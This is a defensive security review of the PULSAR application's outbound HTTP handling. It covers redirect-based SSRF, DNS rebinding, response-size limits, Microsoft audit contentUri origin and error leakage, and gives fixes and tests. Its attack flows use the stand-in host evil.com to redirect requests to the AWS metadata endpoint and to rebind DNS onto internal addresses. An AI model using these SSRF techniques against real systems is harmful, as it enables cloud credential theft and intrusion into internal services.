# PULSAR Outbound HTTP Security Review

## Executive Summary

The initial delegated review identified several outbound-HTTP hypotheses. Source tracing and focused tests confirm one narrow code defect: alert webhook and SIEM requests followed redirects by default, and 3xx responses were treated as successful delivery. That behavior is fixed in the current worktree and covered by regression tests.

The following remain deployment-dependent or unverified questions rather than confirmed critical vulnerabilities:

- DNS names are not resolved and pinned by `validate_outbound_url()` before connection. Test DNS rebinding with an approved canary and the actual egress path.
- Microsoft audit `contentUri` values are passed to the shared HTTP client without a separate origin policy. Establish the trust model and test the effective feed/client behavior before changing the allowlist.
- Shared HTTP helpers buffer JSON responses and surface some upstream response text. Assess response limits, error disclosure, and retry behavior against the actual authenticated upstreams and payload bounds.

The report below preserves the original review details as hypotheses and marks their evidence status explicitly; it is not evidence that the live deployment is exploitable.

## Outbound HTTP hypotheses and hardening notes

### 1. Redirect handling (fixed in current worktree)

**Evidence status:** Confirmed source behavior; deployment-dependent exploitability.

Before the fix, `validate_outbound_url()` ran once before the alert/SIEM request, `requests` followed redirects by default, and `raise_for_status()` accepted 3xx responses. The current `backend/notifications.py` and `backend/siem.py` paths pass `allow_redirects=False` and accept only 2xx responses. Regression coverage is in `backend/tests/test_refactor.py`.

The original attack flow below is therefore historical reproduction material, not current behavior in this worktree. It also assumes control of an administrator-configured destination or its upstream response; it does not establish an unauthenticated application exploit.


**Root Cause:**
- `validate_outbound_url()` called ONCE before request (siem.py:27, notifications.py:178)
- `requests` follows redirects by default (allow_redirects=True, max_redirects=30)
- Redirect targets NOT re-validated

**Attack Flow:**
```
1. Attacker sets ALERT_WEBHOOK_URL = "https://evil.com/hook"
2. validate_outbound_url("https://evil.com/hook") → ✓ PASS (public domain)
3. notifications.py:65 → requests.post("https://evil.com/hook", ...)
4. evil.com responds: HTTP/1.1 302 Found, Location: http://169.254.169.254/latest/meta-data/
5. requests follows redirect WITHOUT re-validation
6. Result: AWS metadata service accessed, credentials leaked
```

**Affected Code:**
- **notifications.py:65** - `requests.post(url, json=payload, timeout=WEBHOOK_TIMEOUT, ...)`
- **siem.py:15** - `session.post(settings.SIEM_WEBHOOK_URL, json=event, timeout=10)`
- **utils/http.py:23** - `requests.get(url, ...) # no allow_redirects override`
- **utils/http.py:31** - `requests.post(url, ...) # no allow_redirects override`
- **graph/auth.py:82** - `requests.post(url, data=data, timeout=15)` (Microsoft endpoint)

**Remediation:**
```python
# notifications.py:65
return requests.post(url, json=payload, timeout=WEBHOOK_TIMEOUT, 
                     allow_redirects=False,  # ← ADD THIS
                     headers={"Content-Type": "application/json"})

# siem.py:15
res = session.post(settings.SIEM_WEBHOOK_URL, json=event, timeout=10, 
                   allow_redirects=False)  # ← ADD THIS
```

**Test Case:**
```python
def test_webhooks_reject_redirects(httpserver):
    httpserver.expect_request("/hook").respond_with_data(
        "", status=302, headers={"Location": "http://169.254.169.254/"}
    )
    result = send_notification(httpserver.url_for("/hook"), "generic", "r", "low", "m", {})
    assert result is False  # Delivery should fail, not follow redirect
```

---

### 2. DNS REBINDING (TOCTOU) — unverified hypothesis

**Evidence status:** No consumer-boundary reproduction; requires deployment-dependent testing with an approved canary.

**Impact:** Time-of-check/time-of-use attack bypasses IP blocklist

**Root Cause:**
- `utils/ssrf.py:validate_outbound_url()` parses hostname string but does NOT resolve DNS
- Only checks if hostname string is in `_BLOCKED_HOSTS = {"localhost", "127.0.0.1", ...}`
- Attacker controls DNS with TTL=0, changes resolution between validation and request

**Attack Timeline:**
```
T+0ms:  validate_outbound_url("https://evil.com/hook")
        → urlparse → hostname="evil.com"
        → "evil.com" not in _BLOCKED_HOSTS → ✓ PASS
T+5ms:  requests.post("https://evil.com/hook")
        → DNS query → evil.com A 127.0.0.1 (attacker changed record)
        → Connection to 127.0.0.1:443 succeeds
        → Internal service accessed
```

**Proof:** utils/ssrf.py:22-27 only validates IP literals, not DNS results:
```python
try:
    ip = ipaddress.ip_address(hostname)  # Only succeeds if hostname is "1.2.3.4" format
except ValueError:
    ip = None  # DNS name - NO RESOLUTION PERFORMED
if ip and (ip.is_private or ip.is_loopback ...):  # Never reached for DNS names
    raise ValueError(...)
```

**Remediation:**
```python
# utils/ssrf.py - ADD DNS resolution
import socket

def validate_outbound_url(url: str, *, https_only: bool = False, allowed_domains: list[str] | None = None) -> str:
    parsed = urlparse(url)
    # ... existing scheme/hostname checks ...
    
    try:
        ip = ipaddress.ip_address(hostname)
        # Existing IP literal validation
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            raise ValueError(f"IP '{hostname}' is not allowed")
    except ValueError:
        # DNS name: resolve and validate ALL returned IPs
        if hostname in _BLOCKED_HOSTS:
            raise ValueError(f"hostname '{hostname}' is blocked")
        
        try:
            addr_info = socket.getaddrinfo(hostname, None, family=socket.AF_UNSPEC)
            for family, _, _, _, sockaddr in addr_info:
                resolved_ip = ipaddress.ip_address(sockaddr[0])
                if (resolved_ip.is_private or resolved_ip.is_loopback or 
                    resolved_ip.is_link_local or resolved_ip.is_reserved):
                    raise ValueError(f"'{hostname}' resolves to forbidden IP {resolved_ip}")
        except socket.gaierror as exc:
            raise ValueError(f"DNS resolution failed for '{hostname}': {exc}")
    
    # ... existing domain allowlist ...
    return hostname
```

**Test Cases:**
```python
def test_dns_rebinding_blocked(monkeypatch):
    # Mock DNS to return localhost
    def fake_getaddrinfo(host, port, family, type):
        return [(socket.AF_INET, socket.SOCK_STREAM, 0, '', ('127.0.0.1', 0))]
    
    monkeypatch.setattr(socket, "getaddrinfo", fake_getaddrinfo)
    with pytest.raises(ValueError, match="resolves to forbidden IP"):
        validate_outbound_url("https://evil.com/hook")

def test_ipv6_link_local_blocked_via_dns():
    # Real DNS test - requires test domain pointing to fe80::1
    with pytest.raises(ValueError, match="resolves to forbidden IP"):
        validate_outbound_url("https://link-local-test.example/")
```

---

### 3. Response-size limits — hardening question

**Evidence status:** Source shows buffered JSON responses, but the attacker-controlled input and realistic payload bounds have not been established for the authenticated Microsoft endpoints.

**Potential impact:** Memory exhaustion if an upstream response exceeds worker capacity.

**Current State:**
- All `requests.get/post` use default `stream=False` (loads full response into RAM)
- No Content-Length pre-check before `.json()` calls
- Attacker returns multi-GB response → Python process OOM killed

**Affected Paths:**
- **utils/http.py:40** - `res.json()` after `get_with_retry`
- **graph/auth.py:84** - `res.json()` on token endpoint
- **graph/resolve.py:32** - `res.json()` on Graph directory lookups (30+ per enrichment)
- **sources/unified_audit.py:66** - `get_json(content_uri, ...)` downloads audit blobs

**Exploitation:**
```python
# Attacker compromises Office 365 or sets malicious SIEM_WEBHOOK_URL
# Returns: Content-Length: 2147483648\r\n\r\n{"data": "A"*2GB}
# Result: Python process allocates 2GB, OOM killed or swaps
```

**Remediation:**
```python
# utils/http.py - ADD size-limited reader
import json

MAX_RESPONSE_BYTES = 10 * 1024 * 1024  # 10 MB

def _read_with_limit(res: requests.Response, max_bytes: int = MAX_RESPONSE_BYTES) -> bytes:
    """Stream response body with size enforcement."""
    content_length = res.headers.get("content-length")
    if content_length and int(content_length) > max_bytes:
        raise ValueError(f"Response too large: {content_length} bytes (max {max_bytes})")
    
    chunks = []
    total = 0
    for chunk in res.iter_content(chunk_size=65536):
        total += len(chunk)
        if total > max_bytes:
            raise ValueError(f"Response exceeded {max_bytes} bytes")
        chunks.append(chunk)
    return b"".join(chunks)

# MODIFY get_json (line 35)
def get_json(url: str, *, what: str, headers: dict | None = None, 
             params: dict | None = None, timeout: float = 20, max_bytes: int = MAX_RESPONSE_BYTES):
    try:
        res = get_with_retry(url, headers=headers, params=params, timeout=timeout)
        res.raise_for_status()
        body = _read_with_limit(res, max_bytes)  # ← REPLACE res.json()
        return json.loads(body)
    except Exception as exc:
        raise RuntimeError(f"Failed to {what}: {exc}") from exc
```

**Test Case:**
```python
def test_oversized_response_rejected(httpserver):
    httpserver.expect_request("/big").respond_with_data(
        "x" * (11 * 1024 * 1024),  # 11 MB
        headers={"Content-Type": "application/json"}
    )
    with pytest.raises(ValueError, match="exceeded.*bytes"):
        get_json(httpserver.url_for("/big"), what="test")
```

---

### 4. Microsoft audit `contentUri` origin — unverified hypothesis

**Evidence status:** The feed value is passed to `get_json()` without an explicit origin allowlist, but this review did not establish that a non-Microsoft actor can alter the authenticated feed response or that a malicious URI is accepted by the live tenant. Test with an approved fixture before changing the client behavior.

**Potential impact:** If the upstream response is attacker-influenced, the worker could make an outbound request to an unintended destination with the bearer token header.
**Code Path:**
```python
# sources/unified_audit.py:83-88
contents = _list_content(content_type, token, settings.TENANT_ID, hours, since)
for item in contents[:max_files]:
    content_uri = item.get("contentUri")  # ← Value from manage.office.com response
    if not content_uri:
        continue
    events.extend(_download_content(content_uri, token))  # ← NO VALIDATION

# Line 64
def _download_content(content_uri: str, token: str) -> list[dict]:
    return get_json(content_uri, what="download audit content", 
                    headers={"Authorization": f"Bearer {token}"}, timeout=30) or []
```

**Threat Model:**
1. Office 365 Management API compromised → returns `{"contentUri": "http://169.254.169.254/..."}`
2. Misconfigured CDN/proxy in front of manage.office.com → response tampering
3. Microsoft tenant compromise → attacker can inject malicious audit content references

**Expected Format:**
- Legitimate: `https://<guid>.blob.core.windows.net/...` or `https://manage.office.com/...`
- Attack: `http://localhost:9200/_cluster/health` (internal Elasticsearch)

**Remediation:**
```python
# sources/unified_audit.py:85 - ADD after contentUri extraction
from urllib.parse import urlparse

content_uri = item.get("contentUri")
if not content_uri:
    continue

# VALIDATE DOMAIN
parsed = urlparse(content_uri)
allowed_hosts = (".blob.core.windows.net", "manage.office.com")
if not any((parsed.hostname or "").endswith(host) for host in allowed_hosts):
    logger.warning("Rejected suspicious contentUri", uri=content_uri, tenant=settings.TENANT_ID)
    continue

events.extend(_download_content(content_uri, token))
```

**Test Case:**
```python
def test_content_uri_must_be_azure_blob():
    malicious = [{"contentUri": "http://169.254.169.254/latest/meta-data/"}]
    # Should skip the item, not call get_json
    assert fetch_unified_audit_from_list(malicious) == []
```

---

### 5. ERROR MESSAGE INFORMATION LEAKAGE ⚠️ MEDIUM

**Impact:** Internal URLs, stack traces, Azure errors exposed in exceptions

**Code:**
- **sources/unified_audit.py:55**
  ```python
  raise RuntimeError(f"{content_type} content listing failed ({res.status_code}): {res.text}")
  ```

**Leaked Information:**
```json
# Example res.text from Azure:
{
  "error": {
    "code": "AuthenticationFailed",
    "message": "Server failed to authenticate. Ensure certificate is uploaded to app https://portal.azure.com/#blade/...",
    "innererror": {
      "request-id": "...",
      "date": "...",
      "client-request-id": "..."
    }
  }
}
```

**Remediation:**
```python
# sources/unified_audit.py:55
if res.status_code in (400, 401, 403, 404):
    logger.error("O365 API error", content_type=content_type, status=res.status_code, 
                 body=res.text[:500], tenant=settings.TENANT_ID)
    raise RuntimeError(f"{content_type} content listing failed (HTTP {res.status_code})")
```

---

### 6. RETRY DNS RE-RESOLUTION ⚠️ MEDIUM

**Impact:** DNS rebinding during retry window (up to 14 seconds)

**Code:**
- **utils/http.py:7-16** - Tenacity retry: 3 attempts, exponential backoff (2s, 4s, 8s)
- **notifications.py:57-62** - Same pattern

**Attack:**
```
T+0s:   validate_outbound_url("https://evil.com") → DNS: 203.0.113.1 → ✓ PASS
T+0s:   requests.get("https://evil.com") → ConnectionError (attacker drops SYN)
T+2s:   Retry 1 → DNS query → evil.com now returns 127.0.0.1 → SSRF
```

**Remediation:** Move validation inside retry loop (performance cost) OR pin DNS resolution

---

## Code Inventory: All Outbound Requests

| File:Line | Function | Target | SSRF Check | Redirects | Timeout | Size Limit | Retry |
|-----------|----------|--------|------------|-----------|---------|------------|-------|
| notifications.py:65 | Alert webhook | User-controlled | ✓ (line 178) | ✗ DEFAULT | 15s | ✗ | ✓ 3x |
| siem.py:15 | SIEM forward | Admin-controlled | ✓ (line 27) | ✗ DEFAULT | 10s | ✗ | ✗ |
| graph/auth.py:82 | Token fetch | login.microsoftonline.com | ✗ Trusted | ✗ DEFAULT | 15s | ✗ | ✗ |
| graph/audit_logs.py:14 | Entra logs | graph.microsoft.com | ✗ Trusted | ✗ DEFAULT | 20s | ✗ | ✓ 3x |
| graph/resolve.py:28 | Object lookup | graph.microsoft.com | ✗ Trusted | ✗ DEFAULT | 10s | ✗ | ✓ 3x |
| sources/unified_audit.py:52 | List content | manage.office.com | ✗ Trusted | ✗ DEFAULT | 20s | ✗ | ✓ 3x |
| sources/unified_audit.py:66 | **Download content** | **Response-controlled** | ✗ NONE | ✗ DEFAULT | 30s | ✗ | ✓ 3x |
| sources/intune_audit.py:16 | Intune logs | graph.microsoft.com | ✗ Trusted | ✗ DEFAULT | 20s | ✗ | ✓ 3x |

**Requests Default Behavior:**
- `allow_redirects=True` (follows up to 30 redirects)
- `stream=False` (buffers entire response in memory)
- No size limits
- DNS resolution per-request (not cached/pinned)

---

## Secret Leakage Analysis ✓ SECURE

**Secrets Never Sent Outbound:**
- MongoDB URI (local connection only)
- Redis password (local connection only)
- CLIENT_CERTIFICATE_PATH private key (graph/auth.py:57 creates signed JWT, never transmits key)
- WEBHOOK_CLIENT_SECRET (routes/webhooks.py:46 HMAC comparison only)
- MCP_API_KEY (server-side auth only)

**Secrets Sent to Trusted Endpoints:**
- Bearer tokens → login.microsoftonline.com, graph.microsoft.com, manage.office.com (TLS required)
- Certificate assertion JWT → login.microsoftonline.com (signed, not the private key)

**Audit Data Sent Outbound:**
- SIEM: Full normalized events (controlled by admin via SIEM_WEBHOOK_URL, protected by SIEM_ALLOWED_DOMAINS)
- Alerts: Defanged event fields (URLs/markdown neutralized per notifications.py:21-30)

---

## Remediation Summary

### Completed in current worktree

1. `backend/notifications.py` — disable redirects and reject non-2xx webhook responses.
2. `backend/siem.py` — disable redirects and reject non-2xx SIEM responses.
3. `backend/tests/test_refactor.py` — consumer-boundary regressions for both paths.

### Open hardening and assurance questions

4. `backend/sources/unified_audit.py:85-88` — establish and enforce the approved `contentUri` origin policy after testing legitimate Microsoft feed shapes.
5. `backend/utils/ssrf.py:22-27` — decide whether DNS resolution/pinning belongs in the application or egress boundary, then test with an approved canary.
6. `backend/utils/http.py:35-42` and upstream callers — assess response-size limits, error-message exposure, pagination bounds, and retry behavior against real payload limits.

---

## Test Coverage Required

The current worktree contains redirect regressions in `backend/tests/test_refactor.py`. Additional outbound hardening tests should be added only after the deployment/client trust model is agreed: DNS rebinding, approved `contentUri` origins, response-size limits, error sanitization, and retry behavior.

---

## Conclusion

The delegated outbound review produced one confirmed, narrow code defect and several deployment-dependent hypotheses. The redirect defect is fixed and covered by the current test suite. DNS rebinding, `contentUri` origin, response-size, and error-disclosure items remain bounded questions for the pentest; they are not confirmed critical vulnerabilities from the evidence available here.

The authentication changes are documented separately in `panes/pulsar-findings.md`.

